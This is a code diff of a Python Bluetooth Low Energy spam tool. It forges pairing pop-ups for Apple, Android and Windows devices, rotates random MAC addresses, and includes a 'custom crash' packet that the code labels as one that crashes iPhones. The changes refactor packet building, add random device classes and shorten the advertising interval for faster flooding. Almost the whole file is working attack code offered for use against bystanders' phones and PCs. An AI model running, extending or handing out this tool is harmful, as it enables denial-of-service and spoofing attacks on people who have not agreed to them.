@@ -1,19 +1,23 @@
 # Author: ECTO-1A & SAY-10
 # Github: https://github.com/ECTO-1A
 
+import argparse
+import random
 # Based on the previous work of chipik / _hexway
 from dataclasses import dataclass
-from pprint import pprint
-import random
-import argparse
-from time import sleep
 from enum import Enum, auto
+from pprint import pprint
+from time import sleep
 from typing import Sequence
 
 import bluetooth._bluetooth as bluez
 
-from utils.bluetooth_utils import change_internal_mac_addr, get_internal_mac_addr, toggle_device, start_le_advertising, stop_le_advertising
+from utils.bluetooth_utils import (change_internal_mac_addr,
+                                   get_internal_mac_addr, start_le_advertising,
+                                   stop_le_advertising, toggle_device)
 from utils.fast_pair_models import all_fp_models
+from utils.class_of_device import cod
+
 
 # Add a docstring to describe the purpose of the script
 help_desc = '''
@@ -23,44 +27,47 @@ Apple Proximity Pairing Notification Spoofing
 ---ECTO-1A August 2023---
 
 Based on the previous work of chipik / _hexway
+Ported from flipper firmware by https://github.com/barsikus007
 
 '''
 
-# Define different bt_data options and their corresponding descriptions
-bt_data_options = {
-    1:  "AirPods",
-    2:  "AirPods Pro",
-    3:  "AirPods Max",
-    4:  "AirPods 2nd Gen",
-    5:  "AirPods 3rd Gen",
-    6:  "AirPods Pro 2nd Gen",
-    7:  "PowerBeats 3",
-    8:  "PowerBeats Pro",
-    9:  "Beats Solo Pro",
-    10: "Beats Studio Buds",
-    11: "Beats Flex",
-    12: "Beats X",
-    13: "Beats Solo 3",
-    14: "Beats Studio 3",
-    15: "Beats Studio Pro",
-    16: "Beats Fit Pro",
-    17: "Beats Studio Buds+",
 
-    18: "AppleTV Setup",  # no picture
-    19: "AppleTV Pair",  # no picture
-    20: "AppleTV Join This AppleTV",
-    21: "AppleTV AppleID Setup",
-    22: "AppleTV Wireless Audio Sync",
-    23: "AppleTV HomeKit Setup",
-    24: "AppleTV Keyboard",
-    25: "AppleTV Connecting...",
-    26: "AppleTV Color Balance",
-    27: "HomePod Setup",
-    28: "Setup New iPhone",
-    29: "Transfer Phone Number",
+class PacketBuilder:
+    packet: list[int] = []
+    size = 0
+    i = 0
 
-    # Add more options as needed (don't forget to review get_bt_data function below)
-}
+    def __init__(self, size: int):
+        if size > 31:
+            raise ValueError(f"Name and type length sum is too long ({size} > 31)")
+        self.packet = [0] * size
+        self.size = size
+
+    def override(self, count: int):
+        self.i -= count
+
+    def add(self, data):
+        self.packet[self.i] = data
+        self.i += 1
+
+    def add_bytearray(self, data):
+        for byte in data:
+            self.add(byte)
+
+    def add_random_bytearray(self, size: int):
+        self.add_bytearray([random.randint(0, 255) for _ in range(size)])
+
+    def add_random_mac(self):
+        self.add_random_bytearray(6)
+
+    def build(self):
+        assert self.i == self.size == len(self.packet)
+        return self.packet
+
+    def print(self) -> str:
+        return "(" + (', '.join([f"0x{c:02X}" for c in self.packet])) + ")"
+
+
 
 class ContinuityType(Enum):
     AirDrop = 0x05
@@ -125,6 +132,42 @@ na_actions = {
     "Transfer Phone Number": 0x02,
 }
 
+# Define different bt_data options and their corresponding descriptions
+bt_data_options = {
+    1:  "AirPods",
+    2:  "AirPods Pro",
+    3:  "AirPods Max",
+    4:  "AirPods 2nd Gen",
+    5:  "AirPods 3rd Gen",
+    6:  "AirPods Pro 2nd Gen",
+    7:  "PowerBeats 3",
+    8:  "PowerBeats Pro",
+    9:  "Beats Solo Pro",
+    10: "Beats Studio Buds",
+    11: "Beats Flex",
+    12: "Beats X",
+    13: "Beats Solo 3",
+    14: "Beats Studio 3",
+    15: "Beats Studio Pro",
+    16: "Beats Fit Pro",
+    17: "Beats Studio Buds+",
+
+    18: "AppleTV Setup",  # no picture
+    19: "AppleTV Pair",  # no picture
+    20: "AppleTV Join This AppleTV",
+    21: "AppleTV AppleID Setup",
+    22: "AppleTV Wireless Audio Sync",
+    23: "AppleTV HomeKit Setup",
+    24: "AppleTV Keyboard",
+    25: "AppleTV Connecting...",
+    26: "AppleTV Color Balance",
+    27: "HomePod Setup",
+    28: "Setup New iPhone",
+    29: "Transfer Phone Number",
+
+    # Add more options as needed (don't forget to review get_bt_data function below)
+}
+
 # Hex data map
 hex_data = {
     1:  (0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00),
@@ -160,46 +203,34 @@ hex_data = {
     # Add more as needed (don't forget to review get_bt_data function below)
 }
 
-
-def make_packet_apple(packet_type: ContinuityType, *, model: int = 0, action: int = 0) -> tuple[Sequence[int], int]:
+def make_packet_apple(packet_type: ContinuityType, *, model: int = 0, action: int = 0) -> Sequence[int]:
     if model == 0:
         model = random.choice(list(pp_models.values()))
     if action == 0:
         action = random.choice(list(na_actions.values()))
     size = packet_sizes[packet_type]
-    packet = [0] * size
-    i = 0
-    packet[i] = size - 1  # Size
-    i+=1
-    packet[i] = 0xFF  # AD Type (Manufacturer Specific)
-    i+=1
-    packet[i] = 0x4C  # Company ID (Apple, Inc.)
-    i+=1
-    packet[i] = 0x00  # ...
-    i+=1
-    packet[i] = packet_type.value  # Continuity Type
-    i+=1
-    packet[i] = size - i - 1  # Continuity Size
-    i+=1
+    builder = PacketBuilder(size)
+
+    builder.add(size - 1)  # Size
+    builder.add(0xFF)  # AD Type (Manufacturer Specific)
+    builder.add(0x4C)  # Company ID (Apple, Inc.)
+    builder.add(0x00)  # ...
+    builder.add(packet_type.value)  # Continuity Type
+    builder.add(size - builder.i - 1)  # Continuity Size
+
     match packet_type:
         case ContinuityType.ProximityPair:
-            packet[i] = 0x07  # Prefix (paired 0x01 new 0x07 airtag 0x05)
-            i += 1
-            packet[i] = (model >> 0x08) & 0xFF
-            i += 1
-            packet[i] = (model >> 0x00) & 0xFF
-            i += 1
-            packet[i] = 0x55  # Status
-            i += 1  # TODO why 0x55 not 0x75 ?
-            packet[i] = random.randint(0, 99)  #  Buds Battery Level
-            i += 1
-            packet[i] = random.randint(0, 79)  # Charging Status and Battery Case Level
-            i += 1
-            packet[i] = random.randint(0, 255)  # Lid Open Counter
-            i += 1
-            packet[i:i+16] = [random.randint(0, 255) for _ in range(16)]  # Encrypted Payload
-            i += 16
-            return packet, size
+            builder.add(0x07)  # Prefix (paired 0x01 new 0x07 airtag 0x05)
+            builder.add((model >> 0x08) & 0xFF)
+            builder.add((model >> 0x00) & 0xFF)
+            builder.add(0x55)  # Status  TODO why 0x55 not 0x75 ?
+            builder.add(random.randint(0, 99))  # Buds Battery Level
+            builder.add(random.randint(0, 79))  # Charging Status and Battery Case Level
+            builder.add(random.randint(0, 255))  # Lid Open Counter
+            builder.add(0x00)  # Device Color
+            builder.add(0x00)
+            builder.add_random_bytearray(16)
+            return builder.build()
         case ContinuityType.NearbyAction:
             flags = 0xC0
             if action == 0x20 and random.randint(0, 1):
@@ -207,13 +238,10 @@ def make_packet_apple(packet_type: ContinuityType, *, model: int = 0, action: in
             if action == 0x09 and random.randint(0, 1):
                 flags = 0x40  # Glitched 'Setup New Device'
 
-            packet[i] = flags
-            i += 1
-            packet[i] = action
-            i += 1
-            packet[i:i+3] = [random.randint(0, 255) for _ in range(3)]  # Authentication Tag
-            i += 3
-            return packet, size
+            builder.add(flags)
+            builder.add(action)
+            builder.add_random_bytearray(3)  # Authentication Tag
+            return builder.build()
         case ContinuityType.CustomCrash:
             # Found by @ECTO-1A
 
@@ -224,76 +252,53 @@ def make_packet_apple(packet_type: ContinuityType, *, model: int = 0, action: in
             if action == 0x09 and random.randint(0, 1):
                 flags = 0x40  # Glitched 'Setup New Device'
 
-            i -= 2  # Override segment header
-            packet[i] = ContinuityType.NearbyAction.value  # Continuity Type
-            i += 1
-            packet[i] = 0x05  # Continuity Size
-            i += 1
-            packet[i] = flags
-            i += 1
-            packet[i] = action
-            i += 1
-            packet[i:i+3] = [random.randint(0, 255) for _ in range(3)]  # Authentication Tag
-            i += 3
+            builder.override(2)  # Override segment header
+            builder.add(ContinuityType.NearbyAction.value)  # Continuity Type
+            builder.add(0x05)  # Continuity Size
+            builder.add(flags)
+            builder.add(action)
+            builder.add_random_bytearray(3)  # Authentication Tag
 
-            packet[i] = 0x00  # Terminator (?)
-            i += 1
-            packet[i] = 0x00  # ...
-            i += 1
+            builder.add(0x00)  # Terminator (?)
+            builder.add(0x00)  # ...
 
-            packet[i] = ContinuityType.NearbyInfo.value  # Continuity Type (?)
-            i += 1
-            packet[i:i+3] = [random.randint(0, 255) for _ in range(3)]  # Continuity Size (?) + Shenanigans (???)
-            i += 3
-            return packet, size
+            builder.add(ContinuityType.NearbyInfo.value)  # Continuity Type (?)
+            builder.add_random_bytearray(3)  # Continuity Size (?) + Shenanigans (???)
+            return builder.build()
     raise NotImplementedError()
 
 
-def make_packet_android(*, model: int = 0) -> tuple[Sequence[int], int]:
+def make_packet_android(*, model: int = 0) -> Sequence[int]:
     if model == 0:
         model_name = random.choice(list(all_fp_models))
         model = all_fp_models[model_name]
         if isinstance(model, list):
             model = random.choice(model)
     size = 14
-    packet = [0] * size
-    i = 0
+    builder = PacketBuilder(size)
 
-    packet[i] = 3  # Size
-    i += 1
-    packet[i] = 0x03  # AD Type (Service UUID List)
-    i += 1
-    packet[i] = 0x2C  # Service UUID (Google LLC, FastPair)
-    i += 1
-    packet[i] = 0xFE  # ...
-    i += 1
+    builder.add(3)  # Size
+    builder.add(0x03)  # AD Type (Service UUID List)
+    builder.add(0x2C)  # Service UUID (Google LLC, FastPair)
+    builder.add(0xFE)  # ...
 
-    packet[i] = 6  # Size
-    i += 1
-    packet[i] = 0x16  # AD Type (Service Data)
-    i += 1
-    packet[i] = 0x2C  # Service UUID (Google LLC, FastPair)
-    i += 1
-    packet[i] = 0xFE  # ...
-    i += 1
-    packet[i] = (model >> 0x10) & 0xFF
-    i += 1
-    packet[i] = (model >> 0x08) & 0xFF
-    i += 1
-    packet[i] = (model >> 0x00) & 0xFF
-    i += 1
+    builder.add(6)  # Size
+    builder.add(0x16)  # AD Type (Service Data)
+    builder.add(0x2C)  # Service UUID (Google LLC, FastPair)
+    builder.add(0xFE)  # ...
+    builder.add((model >> 0x10) & 0xFF)
+    builder.add((model >> 0x08) & 0xFF)
+    builder.add((model >> 0x00) & 0xFF)
 
-    packet[i] = 2  # Size
-    i += 1
-    packet[i] = 0x0A  # AD Type (Tx Power Level)
-    i += 1
+    builder.add(2)  # Size
+    builder.add(0x0A)  # AD Type (Tx Power Level)
 
     dbm = random.randint(-100, 19)
     if dbm < 0:
         dbm += 256
-    packet[i] = dbm # -100 to +20 dBm
-    i += 1
-    return packet, size
+    builder.add(dbm) # -100 to +20 dBm
+    return builder.build()
+
 
 sp_names = [
     "Assquach💦",
@@ -302,8 +307,6 @@ sp_names = [
     "Kink💦",
     "👉👌",
     "🔵🦷",
-    '"Hack the planet"',
-    '"Hack the plane',
 ]
 
 class SwiftPairType(Enum):
@@ -311,7 +314,29 @@ class SwiftPairType(Enum):
     BREDROnly = 0x01
     BLEAndBREDR = 0x02
 
-def make_packet_windows(packet_type: SwiftPairType = SwiftPairType.BREDROnly, *, name: str = "") -> tuple[Sequence[int], int]:
+def build_cod_services() -> str:
+    output = format(random.randint(0, 2047), "#011b")  # 'cod_services'
+    cod_device_class = cod["cod_device_class"]
+
+    cod_major = random.choice(cod_device_class)
+    # skip Miscellaneous and Uncategorized
+    if cod_major["major"] in (0, 31):
+        return build_cod_services()
+    output += format(cod_major["major"], "05b")
+
+    cod_minor = random.choice(cod_major.get("minor", cod_major.get("minor_bits", [])))
+    minor_split = cod_major.get("subsplit", 6)
+    if cod_major.get("minor_bits"):
+        cod_minor_value = random.randint(0, minor_split)
+    else:
+        cod_minor_value = cod_minor["value"]
+    output += format(cod_minor_value, f'0{minor_split}b')
+
+    if cod_subminor := cod_minor.get("subminor"):
+        output += format(random.choice(cod_subminor), f'0{6-minor_split}b')
+    return f"{output}00"
+
+def make_packet_windows(packet_type: SwiftPairType = SwiftPairType.BLEOnly, *, name: str = "") -> Sequence[int]:
     if not name:
         try:
             with open("names.txt", encoding="utf-8") as f:
@@ -323,77 +348,36 @@ def make_packet_windows(packet_type: SwiftPairType = SwiftPairType.BREDROnly, *,
     size = 7 + len(name_bytes)
     size += 3 if packet_type != SwiftPairType.BLEOnly else 0
     size += 6 if packet_type == SwiftPairType.BREDROnly else 0
-    packet = [0] * size
-    i = 0
+    builder = PacketBuilder(size)
 
-    packet[i] = size -1  # Size
-    i += 1
-    packet[i] = 0xFF  # AD Type (Manufacturer Specific)
-    i += 1
-    packet[i] = 0x06  # Company ID (Microsoft)
-    i += 1
-    packet[i] = 0x00  # ...
-    i += 1
-    packet[i] = 0x03  # Microsoft Beacon ID
-    i += 1
-    packet[i] = packet_type.value  # Microsoft Beacon Sub Scenario
-    i += 1
-    packet[i] = 0x80  # Reserved RSSI Byte
-    i += 1
+    builder.add(size -1)  # Size
+    builder.add(0xFF)  # AD Type (Manufacturer Specific)
+    builder.add(0x06)  # Company ID (Microsoft)
+    builder.add(0x00)  # ...
+    builder.add(0x03)  # Microsoft Beacon ID
+    builder.add(packet_type.value)  # Microsoft Beacon Sub Scenario
+    builder.add(0x80)  # Reserved RSSI Byte
 
     if packet_type == SwiftPairType.BREDROnly:
-        packet[i:i+6] = [random.randint(0, 255) for _ in range(6)]  # BREDR MAC Address
-        i += 6
+        builder.add_random_mac()  # BREDR MAC Address
 
     if packet_type != SwiftPairType.BLEOnly:
-        # https://www.bluetooth.com/specifications/assigned-numbers/
-        class_of_device = "0b00000000001"
-        class_of_device += "00101"
-        class_of_device += "01"
-        class_of_device += "0000"
-        class_of_device += "00"
-        packet[i:i+3] = int(class_of_device, 2).to_bytes(3, "big")
-        i += 3
+        builder.add_bytearray(int(build_cod_services(), 2).to_bytes(3, "big"))
 
-    packet[i:i+len(name_bytes)] = name_bytes  # Add name bytes
-    i += len(name_bytes)
-    return packet, size
+    builder.add_bytearray(name_bytes)  # Add name bytes
+    return builder.build()
 
 
-def make_proximity_pair_data(device_name: str) -> Sequence[int]:
-    model = pp_models[device_name]
-    packet, size = make_packet_apple(ContinuityType.ProximityPair, model=model)
-    return packet
-
-
-def make_nearby_action_data(name: str) -> Sequence[int]:
-    model = na_actions[name]
-    packet, size = make_packet_apple(ContinuityType.NearbyAction, model=model)
-    return packet
-
-
-def make_custom_crash_data() -> Sequence[int]:
-    packet, size = make_packet_apple(ContinuityType.CustomCrash)
-    return packet
-
-
-# def print_tuple(seq: Sequence[int]) -> str:
-#     return "(" + (', '.join([f"0x{c:02X}" for c in seq])) + ")"
-# print(*[print_tuple(make_nearby_action_data(i)) + "\n" + print_tuple(hex_data[i]) for i in range(18,30)], sep="\n")
-# print(*[print_tuple(make_packet_windows(name=i)[0]) + "\n" + i for i in sp_names], sep="\n")
-# exit()
-
-
-def make_apple_data(option: int) -> Sequence[int] | None:
+def make_apple_data(option: int) -> Sequence[int]:
     bt_data = hex_data.get(option)
 
     if not bt_data:
-        return
+        raise ValueError(f"Invalid data option: {option}")
     name = bt_data_options[option]
     if "AirPods" not in name and "Beats" not in name:
-        return bt_data
+        return bt_data  # make_packet_apple(ContinuityType.NearbyAction, model=na_actions[name])
 
-    return make_proximity_pair_data(name)
+    return make_packet_apple(ContinuityType.ProximityPair, model=pp_models[name])
 
 
 class SpamTarget(Enum):
@@ -420,13 +404,15 @@ def start_spam(sock, *, pattern: AttackPattern) -> None:
     spam_data = random.choice(pattern.spam_data) if pattern.spam_data else ""
     match pattern.spam_target:
         case SpamTarget.random:
-            pattern.spam_target = random.choice(
-                [
-                    SpamTarget.IOS,
-                    SpamTarget.Android,
-                ]
-            )
-            return start_spam(sock, pattern=pattern)
+            while True:
+                pattern.spam_target = random.choice(
+                    [
+                        SpamTarget.IOS,
+                        SpamTarget.Android,
+                        SpamTarget.Windows,
+                    ]
+                )
+                start_spam(sock, pattern=pattern)
         case SpamTarget.IOS:
             if spam_data:
                 if spam_data.isalnum():
@@ -458,11 +444,11 @@ def start_spam(sock, *, pattern: AttackPattern) -> None:
                 selected_option = random.choice(list(bt_data_options.keys()))
             bt_data = make_apple_data(selected_option)
         case SpamTarget.Android:
-            bt_data, *_ = make_packet_android(model=(int(spam_data, 16) if spam_data.isalnum() else 0))
+            bt_data = make_packet_android(model=(int(spam_data, 16) if spam_data.isalnum() else 0))
         case SpamTarget.Windows:
-            bt_data, *_ = make_packet_windows(name=spam_data)
+            bt_data = make_packet_windows(SwiftPairType.BLEAndBREDR, name=spam_data)
         case SpamTarget.IOSCustomCrash:
-            bt_data = make_custom_crash_data()
+            bt_data = make_packet_apple(ContinuityType.CustomCrash)
         case _:
             return
 
@@ -470,19 +456,22 @@ def start_spam(sock, *, pattern: AttackPattern) -> None:
         random_mac = ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])
 
         # TODO check if specific mac matter
-        if pattern.spam_target in [SpamTarget.Android, SpamTarget.Windows ]:
-            random_mac = f"d4:3a:2c:{random_mac[9:]}"  # google mac prefix
+        # if pattern.spam_target in [SpamTarget.Android, SpamTarget.Windows]:
+        #     random_mac = f"d4:3a:2c:{random_mac[9:]}"  # google mac prefix
 
         change_internal_mac_addr(sock, random_mac)
 
-    # TODO check if 0x01, 0x02, 0x04 are valid ones (especially 0x01 and 0x04)
-    # ADV_IND = 0x00
-    # ADV_DIRECT_IND = 0x01
-    # ADV_SCAN_IND = 0x02
-    # ADV_NONCONN_IND = 0x03
-    # ADV_SCAN_RSP = 0x04
-    # adv_type = args.random_adv and random.randint(0x01,0x04) or 0x03
-    adv_type = pattern.random_adv and random.randint(0x02,0x03) or 0x03
+    ADV_IND = 0x00
+    ADV_DIRECT_IND = 0x01
+    ADV_SCAN_IND = 0x02
+    ADV_NONCONN_IND = 0x03
+    ADV_SCAN_RSP = 0x04
+    if pattern.random_adv:
+        # TODO test on apple
+        # adv_type = random.choice([ADV_SCAN_RSP, ADV_IND, ADV_SCAN_IND, ADV_NONCONN_IND])
+        adv_type = random.choice([ADV_IND, ADV_SCAN_IND, ADV_NONCONN_IND])
+    else:
+        adv_type = ADV_NONCONN_IND
 
     start_le_advertising(sock, adv_type=adv_type, min_interval=pattern.interval, max_interval=pattern.interval, data=bt_data)
     while True:
@@ -494,8 +483,8 @@ def start_spam(sock, *, pattern: AttackPattern) -> None:
 
 def main():
     parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
-    parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval (default 200))')
-    parser.add_argument('-t', '--adv-time', default=2.0, type=float, help='Advertising time (default 2))')
+    parser.add_argument('-i', '--interval', default=20, type=int, help='Advertising interval, ms (default 20))')
+    parser.add_argument('-t', '--adv-time', default=1.0, type=float, help='Advertising time, s (default 1.0))')
     parser.add_argument('-b', '--bt-dev-id', default=0, type=int, help='Bluetooth device ID (default 0)')
     parser.add_argument('-d', '--data', type=str,
                         help='Select a message or device name to send (e.g., \'-d 1\' or \'-d "AirPods Pro"\') (can be splitted by , for multiple)')
@@ -508,7 +497,7 @@ def main():
     parser.add_argument('-c', '--custom-crash', action='store_true', help='Use custom crash method by @ECTO-1A')
     parser.add_argument('-ap', '--apple', action='store_true', help='Apple BLE spam')
     parser.add_argument('-an', '--android', action='store_true', help='Android BLE spam')
-    parser.add_argument('-w', '--windows', action='store_true', help='Windows BLE spam')
+    parser.add_argument('-w', '--windows', action='store_true', help='Windows BLE spam (-t lower than 0.5 is recommended)')
 
     # Randomization
     parser.add_argument('--random-mac', action='store_true', help='Randomly select mac address')
@@ -526,21 +515,22 @@ def main():
         dev_id=args.bt_dev_id,
         interval=args.interval,
         adv_time=args.adv_time,
-        random_mac=True if SpamTarget.random else args.random_mac,
+        random_mac=spam_target is SpamTarget.random or args.random_mac,
         random_adv=args.random_adv,
         spam_data=args.data.split(",") if args.data else [],
         spam_target=spam_target,
         permanent=args.repeat,
-        # permanent=hasattr(args, "data"),  # TODO
     )
+    print()
     pprint(attack_pattern)
+    print()
 
     # the default Bluetooth device is hci0
     toggle_device(attack_pattern.dev_id, True)
 
     try:
         sock = bluez.hci_open_dev(attack_pattern.dev_id)
-        if args.random or args.random_mac:
+        if spam_target is SpamTarget.random or args.random_mac:
             original_mac = get_internal_mac_addr(attack_pattern.dev_id)
             print(f"Your original mac address is {original_mac}\nIt will restored after you stop the script\n")
     except Exception as e:
@@ -555,9 +545,9 @@ def main():
     except KeyboardInterrupt:
         stop_le_advertising(sock)
     except Exception as e:
-        print(f"An error occurred: {e}")
+        print(f"An error occurred ({type(e)}): {e}")
         stop_le_advertising(sock)
-    if args.random_mac:
+    if spam_target is SpamTarget.random or args.random_mac:
         print(f"Restoring original mac address {original_mac}...")  # type: ignore
         change_internal_mac_addr(sock, original_mac)  # type: ignore
 
